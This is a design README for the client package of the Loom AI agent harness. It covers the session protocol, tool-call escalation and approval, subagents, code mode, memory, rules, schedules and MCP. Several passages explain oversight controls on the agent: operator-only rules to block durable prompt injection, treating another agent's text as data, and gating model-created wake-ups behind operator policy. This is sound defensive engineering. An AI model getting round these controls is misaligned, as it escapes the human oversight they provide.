# client

## Purpose

The ClientGateway and the session server: the outward face of a live
session. It owns the Part 1.6 websocket protocol as total Gleam codecs,
a per-session hub actor that speaks it to any number of attached
connections, the `mist` websocket transport under that hub, the bridge
that decodes stored escalation JSON back into typed broker grants, the
scripted end-to-end demo that drives the whole M3 flow through the
protocol alone — and, as the tree's host package, the production wiring
adapter (`client/wiring`, promoted from conformance), the system
prompt's assembly and its durable pin (`client/system_prompt`), the four
seams that give a model other agents, code mode, recall over the
repository's own history and a memory that outlives a session
(`client/agency`, `client/codemode`, `client/history`, `client/memory`),
the distillation pipeline that fills that memory
(`client/distill`, a second entry point), plus the
`loomd` entry point (`client/serve`) that boots the whole stack
over one session file. WP-L.

## Key Types

- `client/protocol.{CommandEnvelope, Command}` — the client→server
  envelope `{v, id, cmd, body}` and its fifteen commands (`Subscribe`,
  `CatchUp`, `Prompt`, `PromptContent`, `Steer`, `FollowUp`, `Abort`,
  `Approve`, `Deny`, `Fork`, `Navigate`, `Compact`, `CreateStrand`,
  `ListModels` (wire name `models`), `SetConfig`) plus `UnknownCommand`,
  which keeps an unrecognized name as data.
- `client/protocol.{EventEnvelope, Event}` — the server→client envelope
  `{v, reply_to?, event, seq?, body}` and its events (`SnapshotEvent`,
  `EntryEvent`, `OpTransitionEvent`, `StreamDeltaEvent`, `UsageEvent`,
  `EscalationEvent`, `StrandResultEvent`, `ErrorEvent`, `UnknownEvent`),
  with `Snapshot`, `Strand`, `LiveOp`, `EntryRecord`, `EscalationRecord`,
  `Denial`, and `ModelInfo` as the body shapes (`ModelsSnapshot` is the
  `models` command's reply).
- `client/protocol.ProtocolFault` — what a malformed frame decodes to;
  nothing here crashes.
- `client/gateway.{Gateway, Options, Message, start}` — the hub actor,
  one per served session, over a `runtime/api.Runtime`.
  `with_catalog` and `with_registry` supply the two things `set_config`
  validates against: the model catalogue behind `model_name`, and the
  live tool registry behind `active_tools` (the same registry the
  effect wiring dispatches through; without one, active-set changes are
  refused in band).
- `client/gateway.{attach, detach, handle_text}` — the transport seam: a
  connection is a `fn(String) -> Nil` sink, inbound frames arrive as
  text, and nothing in the module knows about sockets.
- `client/gateway.{commit_forwarder, supervised_commit_forwarder,
  tap_provider}` — the two composition-layer seams: the runtime writer's
  post-commit publication becomes a pull hint, and an injected
  `effects.ProviderSurface` is wrapped so provider deltas tee to the hub
  while the runtime's effect process consumes the stream unchanged. The
  wrapper forwards explicit cancellation and monitors that effect process;
  either cancellation or consumer death tears down the inner handle. The
  forwarder registers under a name and the writer subscribes to that
  name, which is what lets it be supervised and restarted without the
  writer noticing.
- `client/provider_relay.{prepare, wrap}` — the shared provider-wrapper
  ownership seam: `prepare` returns a minimal public custodian before it
  releases the guard, while `wrap` is the prepare-and-begin compatibility
  facade. The
  guard remains the inner surface's direct consumer, and a separately
  monitored observer runs the synchronous callback before each event is
  forwarded. The guard installs its drain monitor on the inner owner before
  `begin`, and the custodian
  adopts the guard, leaf observer, and transitive inner stream owner before
  each begins work. A terminal is not forwarded until that original monitor
  reports a normal exit. Cancel travels inward, an unacknowledged cancel
  becomes terminal `CancellationUnconfirmed` after one fixed grace, and the
  custodian remains alive until the registered subtree drains. Guard or
  observer death becomes a prompt in-band transport failure only after that
  drain is proved.
  The guard itself is a **`weft/state_machine`**, started `sm.unlinked` by the
  consumer it serves so a guard crash reaches the custodian's worker adoption
  rather than the consumer's link. Its state ADT is `Phase` — `Parked` (the
  wait for the begin permit), `Forwarding`, `Cancelling`, and the three ways
  this relay ends (`ProvingTerminal` holding the terminal the observer has
  already seen, `ProvingFailure` bounding the drain wait after the relay's own
  worker failed, `Proving` waiting out an answer already sent or deliberately
  withheld). Its data is `Awaiting` before the permit and `Relaying` after it,
  which is where everything that moves per event lives: the outstanding
  observation, the events queued behind it, and the inner owner's drain proof.
  Both deadlines are therefore structural rather than scheduled: the
  cancellation grace is a **state timeout** on `Cancelling`, which is what
  makes it one fixed proof deadline a flood of late deltas cannot renew, and
  the request deadline is an **event timeout** re-armed by each forwarding
  step that leaves the guard waiting on the inner stream. A parked guard
  selects three things — the permit, the control subject, its consumer's
  monitor — because the stream's own channels are created by the work the
  permit authorises, in that process; the same step that grants the permit and
  transitions to `Forwarding` or `Cancelling` widens the mailbox with
  `sm.with_selector`.
- `client/server.{Config, Auth, Server, serve}` — the `mist` websocket
  transport on `/v1/ws`; `LocalAuth(token_path)` mints a startup token
  into a `0600` file, `BearerAuth(token)` is the caller-supplied one.
- `client/install.{root, helper, helper_name, gleam_compiler, erl, seed,
  seed_directory, existing_file, existing_directory, bundled_helper,
  bundled_seed, first_of}` — where this Loom is installed, and what ships
  beside it. `root()` is `code:root_dir()`: the unpacked release tree for
  a release, the OTP installation root for every other run. Everything
  else is a path built onto it and *probed*, so existence is the whole
  discriminator and nothing special-cases a development host. `erl()`
  names `erts-<vsn>/bin/erl` with the version read from the live system
  rather than globbed for, so it is the emulator actually running the
  harness. `first_of` is the ladder itself — the first rung that answers
  wins, and no rung below it is evaluated.
- `client/grants` — decoding the runtime's opaque escalation JSON back
  into `broker/policy.Grant`, and encoding it again. Pure and total.
- `client/escalate.{Config, Message, Refused, Decision, Escalations,
  seam, start, none, record_id, action_digest, action_preview,
  default_config}` — parking: what a production tool call does when the
  broker refuses it on policy. `seam` closes over a process *name* (the
  Agency's knot, the Agency's answer) and `start` puts the runtime
  behind that name after `api.open`; `record_id` is the deterministic
  `{strand, tool, wanted diff}` digest a retry loop dedupes onto, with a
  limit grant contributing its field and not its model-supplied
  magnitude; `action_digest` is the *other* identity, over the call's
  effective arguments canonicalised (objects key-sorted recursively,
  arrays left ordered), which is what an approval binds to;
  `action_preview` is its bounded human rendering, display-only and cut
  at 2 KB on a codepoint boundary; `Config.max_records` caps the
  distinct wants a session will file and `Config.max_asks` caps the
  questions any one of them may put; `none()` is the no-plane seam under
  which a refusal settles exactly as it did before escalations existed.
- `client/gateway.attached` — how many connections are attached right
  now. The honest answer to "is a human there?", which is what the
  escalation seam asks before it holds a call open. A hub that is gone,
  that dies mid-question, or that does not answer inside a second all
  count as nobody attached rather than exiting the asker.
- `client/catalog.{Catalog, CatalogModel, Dialect, parse, gateway}` —
  the model catalogue: a total, strict parser for the `loom.toml`
  format (via the `tom` TOML package; `docs/examples/loom.toml` is the
  worked example) and the builder that turns a catalogue into the
  provider gateway's registry — one provider per entry, named by the
  entry (so durable identities store `{catalogue-name, model_id}`),
  one route per `[roles]` row. The hub serves it as the `models`
  listing and resolves `set_config`'s `model_name` against it; `serve`
  loads it from `--config` or shapes a one-entry catalogue from the
  `LOOM_*` environment.
- `client/demo.run` — the M3 acceptance flow end to end, executed as a
  test and runnable as `gleam run -m client/demo`.
- `test/client/tui_e2e_test` + `test/support/terminal` — the real
  `loom` binary against a real `serve.boot`, in a real terminal
  (`tmux` on a private socket, declared geometry, every wait a predicate
  over pane content with a deadline). The only test in the tree with a
  fake on *neither* side of the protocol; only the model is scripted.
  Skips — loudly — when `tmux` or `go` is absent.
- `client/agency.Config.subagent_model` — the host's `subagent` route,
  resolved, as a closure: `Ok(#(identity, thinking))` seeds a spawned
  child with that model and that level, `Error(Nil)` inherits the parent
  wholesale. A closure for the same reason `clock` and `rest` are — the
  Agency is built before `api.open`.
- `client/agency.{Config, Message, seam, start, reaping_hooks,
  child_name, is_subagent, frame_message, frame_brief, result_contract,
  result_schema_prefix}` — the Agency:
  `tools/agent`'s messaging seam implemented over a live runtime. `seam`
  closes over a process *name* so it can be built before `api.open`;
  `start` puts the returned runtime behind that name. Everything with
  teeth lives here — the descendant-only addressing rule, the depth and
  fan-out caps, the multi-handle wait loop, the lineage ledger's four
  reconciliation branches, the lazy deadline reap, the result contract a
  spawn's `result_schema` writes and the child is judged against, and the
  framing that marks another agent's text as data. `child_name` mints
  `sub:{parent}/{slug}-{digest}`, the digest being
  `agent.call_site_digest` over the caller's coordinates and the `Minter`
  inside them.
- `client/codemode.{Config, Toolchain, seam, discover, default_config,
  execute, exec_config, build_config, exec_root, execution_policy,
  translate, pooled_budget}` — code mode: `tools/codemode`'s seam
  implemented over the real pipeline, the other package this one exists
  to join (`tools` cannot see `codemode`, which already depends on it).
  `discover` locates `gleam`, `erl` and a verified build seed or says
  what is missing *and how to supply it*, each executable through
  `locate` — the tree this server shipped in first, `PATH` second;
  `seam` closes over a `Config` and needs no process
  name, because the broker it dispatches through already exists;
  `execute` prepares a per-execution directory, drives vet → compile →
  run under the caller's own `{op_id, step_id}`, restates the pipeline's
  two enforcement reports in the tool's vocabulary, and removes the
  directory again. `Config` carries no `vet_policy` of its own: it
  carries `surface`.
- `client/codemode.launch_refusal` — what policy composition would
  refuse a satellite launch for: `tools/codemode.RunRefused` carrying the
  exact grants that would satisfy it, or `NothingRefused`. `execute`
  wraps the pipeline's `satellite.Launcher` with it and reports the
  answer outward beside the outcome, which is the whole of what makes an
  escalation record *mintable* from inside code mode (#97). Public
  because it is the wrapper's entire decision and the only part of it a
  hermetic test can hold still.
- `client/codemode.{workspace_seam, over_scratch, into_blobs,
  blob_directory}` — the harness-side capability bridge (issue #16), and
  the half of it that lives on this side of the seam. `workspace_seam`
  builds the eight closures `codemode/workspace`'s router calls: `fs_read`
  and `fs_list` over `tools/fs.resolve_real` and `fs.read_text_file`,
  `fs_write` and `fs_edit` over `fs.resolve_writable` —
  the harness's *own* path boundary and *own* large-file guard, never a
  second resolution — `kv_*` over the session's `client/scratch` store,
  and `emit` over the session's blob root. `blob_directory` is the one
  place `.blobs` is written down, read by both this module and
  `client/serve`, so an artifact a program emits and an oversized `bash`
  output that overflowed land in one store under one address. Listing is
  the one operation with no counterpart in the tool set — `tool.FileSystem`
  has no primitive for it — so the enumeration is `simplifile`'s, on a
  path `resolve_real` has already contained, bounded before it is
  classified and answered with lstat semantics so a symlink is never
  called a directory.
- `client/history.{Config, Message, index_file, default_timeout_ms,
  index_beside, probe, over_session, sqlite_generation, start, supervised,
  stop, poke, synchronize, seam, commit_pull, supervised_commit_pull}` —
  the one process that owns this repository's `events/search` index, and
  the seams that reach it. Addressed by process name, like the Agency and
  the scratch store, so the tool seam is built before the holder exists
  and a restart under the same name reopens the index file. `probe` is
  the boot question: an index that will not open registers no
  `history_search` tool and logs one worded line, never a boot refusal.
  `over_session` binds the holder to one open session's store and takes
  its rewrite generation as a **thunk** (`sqlite_generation`), called
  fresh on every pull, because a precise rewrite bumps it underneath a
  long-lived holder — and a generation that cannot be read skips the sync
  rather than guessing zero.
- `client/notes.{max_digest_bytes, fence, digest_hooks, digest, cells,
  strand_of}` — the `agent/` notes digest injected at run start.
  `digest_hooks` **wraps** an existing `run_start` rather than setting it
  (`hooks.with_run_start` replaces, so a setter would silently drop a
  previous layer), resolves the strand from the `OpId` through the
  durable `op.meta` cell, reads the strand's `agent/{strand}/` fact cells
  straight off the session store — hooks are built before `api.open`, so
  there is no runtime handle and no Agency to ask — and renders them
  newest-written-first by register seq, capped at 4096 bytes, fenced and
  attributed. A strand with no notes gets nothing at all.
- `client/memory.{memory_file, digest_file, store_beside, digest_beside,
  directory_of, fact_type, lesson_type, preference_type, pipeline_types,
  type_named, short_name, max_digest_bytes, max_distillates,
  max_row_chars, lease_ttl_ms, run_lease_ttl_ms, head_key, cursor_key,
  notes_cursor_key,
  note_count_key, Cursor, cursor_from, cursor_value, MemoryFault, Opened,
  open, close, probe, SourceRef, Provenance, no_provenance, Distillate,
  distillate_of, provenance_of, provenance_by_id, names_source,
  append_distillates, head, head_rows, advance_head, replace_head,
  advance_cursors,
  cell, notes_after, safe_text, remember_seam, fence, render_digest,
  read_digest, write_digest, reconcile_digest, digest_hooks, wrapped}` —
  the memory plane: the
  `loom-memory.db` session beside the session files (the fold
  `client/history` established, deliberately *not* the workspace), the
  `loom-memory.digest` sidecar the server injects from, and the host side
  of the `remember` door. Opened with the ordinary writer lease and
  `session.ensure_id` called by hand, because nothing here goes through
  `runtime/api` — which is also why its bookkeeping cells need no
  reserved prefix. **The TTL is the caller's**, and the two callers are
  nothing alike: a `remember` write covers one commit, while a run's
  commits are separated by whole provider turns and it takes
  `run_lease_ttl_ms` so no opener can steal the file out from under a
  model turn (the `rewrite_lease_ttl_ms` precedent, and a constant rather
  than a renewal timer because a command has no supervision tree to hang
  one on). **`append_distillates` and `advance_head` are separate
  on purpose**: rows commit first, the head-and-cursors CAS commits last,
  and a run killed between them leaves the previous head, cursors and
  sidecar standing over inert orphan rows. `render_digest` writes the
  body only — scrubbed, byte-capped, truncation marked — and `wrapped`
  builds the fence and the attribution at injection time, so the file
  cannot forge its own provenance.
  The **erasure cascade's** reading surface is here too (#115).
  `provenance_of` is the total decoder of the `{text, sources, derived_from}`
  payload — anything it cannot read is `no_provenance`, which names
  nothing and is therefore *kept*, so one malformed row can never empty
  memory. `provenance_by_id` pairs each head id with what its row
  records, **one pair per id including ids the store cannot resolve**, so
  an unresolvable head id survives the rewrite rather than vanishing from
  it. `names_source` is the match, at session grain because provenance is
  batch-level. `replace_head` is the write: the head CAS alone, no rows
  and no cursors, sharing `advance_head`'s expectation so the head only
  ever moves under a CAS.
- `client/distill.{Answer, Distiller, Candidate, Extract, Harvest, Report,
  Cascade, Config, default_scan_limit, max_extract_chars, max_notes_per_run,
  default_timeout_ms, distill_owner, extractable, extraction_input,
  extraction_prompt, consolidation_prompt, parse_candidates, config_for,
  with_logger, run, cascade, no_distiller, source_files, target,
  gateway_distiller, main}` — the
  distillation pipeline, runnable as `gleam run -m client/distill --
  --config loom.toml [--session-dir <dir> | --session <path.db>]`. It
  walks the session directory's `*.db` files, skips every one whose
  writer lease is held (**that is the live-session rule, entire**), reads
  each above a `{seq, rewrite generation}` cursor, extracts, consolidates
  against the current head and the `remember` notes, and re-renders the
  sidecar. `extractable` is the anti-feedback exclusion and is a rule
  about types: settled assistant text (`client/rules.scannable_text`,
  shared with the rule scanner) plus compaction and branch summaries, and
  nothing from a user turn or a `CustomEntry`. `Distiller` is the whole
  provider surface, so a test scripts both model turns; `target` picks the
  `Summarize` route when the catalogue has one and the resolved main
  identity when it does not, the summary path's own arrangement.
  Two properties of the pass shape are load-bearing rather than
  incidental. **Only the sources extraction got an answer for** drive the
  cursors and the provenance: advancing a failed source's cursor would
  lose its entries permanently and silently, and naming it in provenance
  would over-claim a contribution #115's cascade would act on. And the
  consolidation turn is dispatched on what extraction **produced**, not
  on what it was offered — a repository whose sources all honestly answer
  `nothing` commits a cursors-only transaction, leaves the head alone,
  and does not re-pay the same extraction turns on every run forever.
  Every run, that one included, ends by reconciling the sidecar against
  the head.
  **`--cascade <source-session-id>` is the second command behind the same
  entry point** (`cascade`, issue #115): the first-order erasure cascade,
  run by the operator *after* `session/repo` has rewritten that source.
  It drops from the head every distillate whose provenance names the
  session and re-renders the sidecar without them. Four things about it
  are load-bearing. It **needs no `--config`** and runs under
  `no_distiller`, because it dispatches no model turn. It **writes no
  rows** — every survivor is already durable — so the pipeline's write
  order holds trivially, and it takes the *short* lease rather than
  `run_lease_ttl_ms`, since nothing slow sits between its commits. It
  **moves no cursor** — and that is a defect rather than a saving. The
  erased source is re-extracted from zero by the rewrite generation the
  erase bumped, but every *other* source keeps its high-water cursor and
  the notes cursor sits past every note already consumed. Since a head is
  uniform in provenance, an effective cascade empties it, so **the
  surviving sources' contribution and every hand-written note become
  permanently unrecoverable by the pipeline**: the next run consolidates
  the erased source alone, over an empty head and no notes. Re-reading
  the other sources is the only rebuild there could be, so not doing it
  is the gap. Issue **#124** carries the mechanism (a cursor rewind on
  drop, a `--rebuild` companion, or a `--dry-run` preview), and
  `distill_test`'s `an_emptying_cascade_loses_the_surviving_sources`
  pins the loss until one lands. And a cascade that
  drops nothing **does not CAS at all**, because writing the identical id
  list back would still bump the cell's seq and lose a concurrent run's
  expectation. First-order: a row whose `derived_from` names a dropped
  row is not chased, and within one head that is vacuous rather than
  deferred. The induction is written out at `memory.replace_head` and
  needs **both** head writers: `advance_head` mints a fresh batch whose
  ids are disjoint from what its `derived_from` names, and `replace_head`
  writes a *subset* of an existing head, which preserves that
  disjointness. A third head writer introducing new ids would void it
  silently. The `Cascade` report carries an `unreadable` count — rows
  kept because their provenance would not decode, which is the one place
  the command under-deletes. `docs/spec-gaps.md`'s M2
  item 9 carries the boundary and the over-deletion it implies.
- `client/scratch.{Bounds, Message, Scratch, start, supervised, stop, seam,
  none, stat, default_bounds}` — the ephemeral scratch store `cap/kv`
  reads and writes: a session-scoped actor, addressed by process name the
  way the Agency is, holding string keys to bytes. Three bounds, each on
  a different way to grow: 256 KiB per entry (refused in band), 8 MiB
  total and 1024 entries (both **evicted**, least-recently-written, which
  is what `cap/kv`'s "may be evicted or reset between calls" contract
  asks for). `Bounds` is a plain record, so `start` passes every one
  through `coherent` first — each field floored at 1, the per-entry
  bound never looser than the total — because a `max_entries` of 0 makes
  the store evict everything it is handed, which a program reads as
  unrelenting eviction and loops on rather than failing. Clamped rather
  than refused: this is a cache whose contract already says values may
  vanish. Gone on restart, deliberately — a store a program can write
  across sessions is a channel from one execution's model output into a
  later execution's input. `none()` is the seam a host with no store
  hands out, and it *refuses* rather than silently succeeding: a `set`
  answering `Ok` into nothing reads to a program as an eviction and it
  loops.
- `client/rules.{Rule, parse, fires_on, scannable_text, injection,
  fired_key, cursor_key, fired_value, cursor_value, cursor_seq,
  max_rules, max_triggers, max_name_length, max_trigger_length,
  max_body_length}` — the triggered project rule store (issue #27,
  design §8). A rule is `{name, triggers, body}` read from `[[rule]]`
  tables in the same `loom.toml` the catalogue comes from, parsed by the
  same strict, total discipline: unknown keys refused, empty and
  oversized fields refused, duplicate names refused, all in words an
  operator can act on. Rules are **operator configuration and never
  model-writable** — a rule is text the harness injects into a model's
  own context, so a store a model could write would be durable prompt
  injection with a delivery mechanism attached. Triggers are literal,
  case-sensitive substrings, any-of per rule, matched over an assistant
  entry's visible text through `events/search.entry_text` — no regex,
  because an operator-supplied pattern reached from model output is an
  unbounded computation driven by the thing being matched. `injection`
  is the fenced, attributed text a fire actually commits.
- `client/rulescan.{Options, default_options, with_logger, start,
  supervised, default_scan_limit, default_checkpoint_every}` — the
  session-scoped scanner actor. Its mailbox *is* `runtime/writer.Event`,
  so it is the writer's second named subscriber beside the commit
  forwarder; on each hint it re-reads the store above a durable cursor
  and never trusts the hint for anything. A fire is one
  `api.steer_marking` — the injection and the rule's write-once
  fired-mark in one transaction — so injected-never-twice is a property
  of the commit rather than of the actor's memory (at-most-once in
  full: the abort corner is `docs/spec-gaps.md`'s item 8). A rule that trips on an
  **idle** strand is *held*, not dropped and not started: the cursor
  stays frozen so the next run finds it again. A held strand the
  `runtime/lineage` ledger says was reaped is judged provably dead
  (issue #113) and **abandoned** rather than retried forever: the
  in-memory `Progress` gets a third state beside held-and-not, the
  pending rules stay unfired (nothing lies about what happened), and the
  transition is logged once, `rule.hold_abandoned`. A terminal
  `strand.last_result` alone is deliberately *not* this signal — see the
  next invariant — so the ledger read happens once per strand per
  incarnation, on the pass a hold begins, and costs nothing before or
  after.
- `client/schedule.{Schedule, Timing, Expiry, Wake, Lateness, Policy,
  parse, parse_policy,
  default_policy, policy_opens_the_door, wake_under, build,
  encode, decode, config_key, config_key_prefix, cancelled_value,
  parse_instant, render_instant, fired_key,
  fired_key_prefix, fired_value, injection, interval_occurrence,
  interval_late, interval_expired, max_schedules, max_model_schedules,
  min_interval_s,
  max_name_length, max_body_length, max_target_length,
  default_max_fires, max_max_fires, default_expires_after_s,
  max_expires_after_s}` — scheduled heartbeats (`docs/design-notes/
  scheduled-heartbeats.md`), the time-triggered sibling of `client/rules`:
  a `[[schedule]]` fires on a clock instead of on a literal match, parsed
  from the same `loom.toml` by the same strict, total discipline. A
  schedule reaches the scanner from one of **two** stores and is the same
  value either way: the operator's `[[schedule]]` tables, and the model's
  own `schedule/config/…` reserved cells created through
  `tools/schedule` (`encode`/`decode`/`config_key`). `Policy` is the
  operator's say over that second door — `off`/`steer`/`wake` from a
  `[schedules]` table — and `default_policy` is **`ModelSchedulesSteer`**: the
  tools are registered and a model may create schedules, but none of
  them can wake an idle strand until the operator writes `"wake"`. The
  design note's addendum has the whole history — the feature shipped
  operator-only, reopened with an open default on the strength of the
  per-schedule expiry, and settled on `steer` once #161 showed that
  expiry bounds a schedule and not a session (a fresh name is a fresh
  clock), which under the priority order makes unsupervised liveness an
  opt-in. `build` is the constructor the model-facing door and `decode`
  share: it enforces exactly what `parse` enforces, through the same
  predicates and constants, so the two creation paths word refusals
  differently and can never disagree about what is allowed. A schedule is
  either `Interval(seconds,
  expiry)`, aligned to a fixed grid (`slot = floor(now_s / seconds)`), or
  `OneShot(at)`, a single RFC3339 UTC instant — never both, no five-field
  cron syntax, no timezones. Every `Interval` schedule carries a
  mandatory `Expiry`: `max_fires` and `expires_after_s` are both always
  active, defaulted when unset, and whichever is reached first ends the
  schedule — the guardrail that caps one schedule's durable fire-mark
  footprint at exactly 1,000 rows and makes `WakesIdle` (below) safe to
  offer at all. `Wake` is `WakesIdle | SteersOnly` and `Lateness` is
  `OnTime | Late`: both are two-variant types rather than the `Bool`s
  they were, because each is read at one end and written at another and
  neither name carries its own polarity. The TOML `wake` key, the stored
  config cell and the tool result all stay booleans on the wire, and
  each boundary writes that translation down once.
  `interval_occurrence`/`interval_late`/`interval_expired`
  are pure functions over the occurrence arithmetic — deliberately
  factored out of the actor that drives them so a fencepost error gets a
  direct, deterministic test rather than one hidden behind a timer
  harness.
- `client/scheduleseam.{Wiring, Door, seam, door, limits,
  describe_timing, cell}` — the host half of the model-facing scheduling
  door, filling `tools/schedule`'s seam the way `client/memory` fills
  `tools/remember`'s and for the same reason (`tools` may not reach a
  session). It is the **only** enforcer of three things: the operator's
  `Policy` (applied through `schedule.wake_under`, which caps `wake`
  rather than vetoing the call, so the tool can tell the model what it
  actually got), the `max_model_schedules`
  ceiling, and the shared bounds via `client/schedule.build`. `Wiring`
  carries `operator_schedules` for one reason worth knowing: both stores
  feed one scanner, which derives a fired-mark from `{target, name}`
  alone, so a model name colliding with an operator's would make two
  schedules share a mark and suppress each other — and this is the only
  place that check can live. `Wiring.runtime` is a **borrow closure**,
  not a runtime: the registry this seam joins is threaded into
  `api.open`, so it is built before a runtime exists, and it reads the
  session's one holder through `agency.borrow_runtime` rather than
  standing up a second actor. `Door` is the same three operations keyed
  on a strand name, which is what `client/codemode` serves `schedule.*`
  over — one implementation behind both doors, so a program and a tool
  call cannot disagree about what this session's schedules are.
- `client/schedulescan.{Options, ModelDoor, Message, default_options,
  with_logger, with_model_door_open, poke, start, supervised}` — the
  scheduled-heartbeat scanner. Every tick unions the operator's fixed
  list with the model's config cells read fresh from the store, never a
  cached list: a cell can appear or be cancelled between any two ticks
  and this actor is restartable, so a cache would be a second source of
  truth. `poke` is what the seam rings after a write so a new schedule
  starts on time rather than at the next armed deadline; it checks the
  name is registered first, because a send to an unregistered name
  raises and the caller is a tool body. `with_model_door_open` sets
  `Options.model_door` to `DoorOpen`, which keeps a slow rescan floor
  when the model may create schedules, so a lost poke self-heals within
  one `min_interval_s` instead of stalling forever.
  Unlike
  `client/rulescan` it is driven by its own injected
  `runtime/effects.Timers.after` deadline, never by a writer hint, and it
  holds no progress state across ticks: every tick re-derives which
  schedules are due or expired from a bounded scan of the write-once
  fired-marks already in the store, read straight off `storage`
  (`client/schedule.fired_key_prefix`) rather than through the writer's
  mailbox — the same isolation `client/rulescan`'s direct reads give it,
  for the same reason: a slow tick must never queue in front of a
  settlement. The same "durable-derived beats durable-stored" argument
  keeps `client/rulescan`'s cursor a checkpoint rather than a source of
  truth.
  A fire is one `api.steer_marking` when `Schedule.wake` is `SteersOnly`
  — the injection and the occurrence's write-once fired-mark in one
  transaction, exactly `client/rulescan`'s at-most-once argument, held on
  an idle strand rather than dropped or started. `WakesIdle` opts into
  `api.send_to_strand_marking` instead, which may start a fresh run on an
  idle strand: the one behavior a triggered rule is never allowed, safe
  here only because a schedule's mandatory expiry bounds how long it can
  keep a session alive. A session closed through a missed window catches
  up to **at most one** late fire per schedule at the next tick, never a
  replay of the backlog: an occurrence is judged late by whether the
  *immediately preceding* slot's fired-mark is missing, never by
  comparing the current time against a boundary computed from that same
  current time, which is always trivially on-time by construction.
- `client/codemode.{over_mcp, seam_allowlist, seam_caps_on}` — what a
  configured MCP server does to the seam a model is offered. One
  `Config.mcp` field, for the reason `surface` is one field: a server
  widens the workspace seam's *allowlist*, its rendered *description*,
  the *generated table* the hermetic build takes, and the capability
  *router*, and a host that could set those apart would eventually set
  them apart. The orchestration seam is widened by none of it, ever —
  which capabilities travel together is the whole of what the split buys.
- `client/codemode.{Surface, Seams, serving, orchestrating,
  surface_seams, surface_seam, seam_policy, seam_caps, tool_seam,
  vetting_seam}` — which code-mode seams this host serves.
  `Surface` is `Workspace`, `Orchestration(agency, spawn_ceiling)` or
  `Both(...)`: one field, because the vetting allowlist, the capability
  router and the admission ceilings have to agree and a host that could
  set them apart would eventually set them apart. `Seams`
  (`WorkspaceOnly` / `OrchestrationOnly` / `BothSeams`) is the same
  choice as a *setting* — what a flag can carry before there is an
  `Agency` to serve the orchestration seam with — and `serving` turns
  one plus an Agency into a `Surface`; `orchestrating` is the
  orchestration-only case of it. `seam(config)` publishes exactly the
  seams the surface serves as `tools/codemode.Seams`, each with the
  allowlist and the serviced capabilities read off the running policy,
  so what the model may ask for and what will judge it cannot drift.
  `tool_seam` / `vetting_seam` are the two directions of the mirror
  between `vet/policy.Seam` and the tool's own `Seam`.
- `client/mcp.{Layer, Server, Refusal, Options, none, serving, start,
  stop, routing, allowed_imports, surfaces, generated, serviced_caps,
  listings, sha256_hex}` — the MCP layer (#106): the configured servers
  this host actually reached. `start` fans every `catalog.McpServer`'s
  bring-up out over a `weft` run — one task per server, bounded by the
  catalogue's own length — rather than folding them one at a time, so an
  N-server boot pays one shared clock for every handshake timeout rather
  than N consecutive ones; `weft.start` hands outcomes back sorted by
  input position, so zipping them against the unchanged `servers` list is
  what restores catalogue order regardless of which server answers first.
  Each task still spawns its server over `mcp/transport.PortTransport`,
  hand-shakes, lists its tools and generates its `cap/mcp/<server>`
  façade, keeping the client **running** for the session because dispatch
  is the same client; each failing step refuses *that* server with a
  worded `Refusal` and the boot goes on without it, and a `Crashed` weft
  worker becomes a worded `Refusal` too rather than taking the boot down.
  `routing` is the capability arm: a cap under `mcp.` is answered as
  `satellite.ServedHere` — no `CallSpec`, no jail, no policy — and
  everything else is handed to the router beneath untouched. The client
  actors are started from a throwaway unlinked process on purpose, two
  `process.spawn_unlinked` calls below `start_one` itself, so a
  third-party server's client cannot fell the server; that isolation does
  not depend on which process runs `start_one` — a weft worker moves who
  calls it, not how the actor is severed from its caller, so bring-up
  needed no re-link back to the boot's own process and no accessor onto
  `mcp/client.Client` to do one. `Layer` is then the only handle on the
  clients, and `serve.shutdown` is what stops them.
- `client/system_prompt.{Host, Rendered, Assembled, Origin, assemble,
  render_pack, pack_source, guidance, pinned_in, pinned, pin}` — the I/O
  half of the pure `prompt` package. `Host` is every `pack.Environment`
  field gathered from a real source; `pack_source` picks the shipped pack
  or the one `LOOM_PROMPT_PACK` names; `render_pack` renders it or
  refuses; `assemble` chooses between the `LOOM_SYSTEM_PROMPT` override,
  the pinned cell and a fresh render; `pinned_in`/`pinned`/`pin` are the
  two ends of the reserved `prompt/` cell. Nothing here is called per
  turn — the whole module runs once, at boot.
- `client/system_prompt.{GuidanceFile, GuidanceOrigin, discover, guidance,
  render_file, origin_name, agents_file, claude_file,
  user_default_directories, max_guidance_file_bytes}` — the session's
  instruction files and the fence they reach the model behind. `discover`
  fills two slots: the `AGENTS.md` instructions (the workspace's own, else
  the operator's global one under `~/.agents` then `~/.loom`) and the
  workspace's `CLAUDE.md`. `guidance` joins them into the one string
  `Host.guidance` carries, each file inside an `<instructions>` fence
  naming its path and its `origin_name` — `workspace` or `user-default` —
  which is the vocabulary the pack's framing prose is written against.
  The home directory is a parameter rather than a `HOME` read, so the
  whole lookup is testable without a process environment; `serve` reads
  `HOME` and passes it in.
- `client/wiring.{request_target, resolved_target, strand_thinking_level,
  thinking_level}` — the model-routing half of the seam: which role (if
  any) a captured identity is on and therefore whether the dispatch walks
  a chain, the `ForResolved`-only target every deferred poll and every
  off-route generation takes, and the two directions of the map between
  the machine's seven-point thinking scale and the provider's four-point
  one — `thinking_level` collapsing for a dispatch, `strand_thinking_level`
  lifting an entry's declared level to seed a strand.
- `client/wiring.{Config, build_effects}` — the production effect seam:
  a `runtime/effects.Effects` over the real provider gateway, broker,
  and tool registry (promoted from `conformance/wiring`; spec-gaps M2
  item 7). The conformance wiring/e2e suites still prove it.
  `Config.escalations` is the escalation seam a policy refusal goes
  through — from `escalating_runner` for a refusal the broker handed
  back, and from the `Ctx.raise_refusal` seam for one a tool met
  elsewhere; both build the same `escalate.Refused` from the same
  `ToolRun`. There is deliberately **no** session-wide grant list,
  because a grant that cannot be attributed to the call in hand must
  widen nothing.
- `client/wiring.{run_tool, terminates}` — the tool-dispatch boundary and
  the one conversion across it. `run_tool` always settles as
  `effects.ToolCompleted`, and its `terminate` is now the outcome's own
  `tool.Terminate` rather than the hardcoded `False` it was: `terminates`
  is where `TerminateRun` becomes the `Bool` the frozen effect type
  carries, and it is the only place the polarity is written down.
- `client/wiring.{compaction_hooks, recording_summaries}` — the two
  halves of live compaction, separable so a host with its own provider
  surface can run the real ones. `compaction_hooks` builds the whole
  `effects.Hooks` record through `runtime/hooks`: real admission from
  the gateway's resolved model facts, threshold and overflow over the
  strand's durable projection, `VerdictGenerate` for every structural
  decision, and the progress hook. `recording_summaries` wraps a
  provider surface so a settled summary is filed in the sink on its way
  past — the same composition shape as `gateway.tap_provider`. The summary
  relay also propagates cancellation and consumer death inward, but records
  nothing when the consumer is gone.
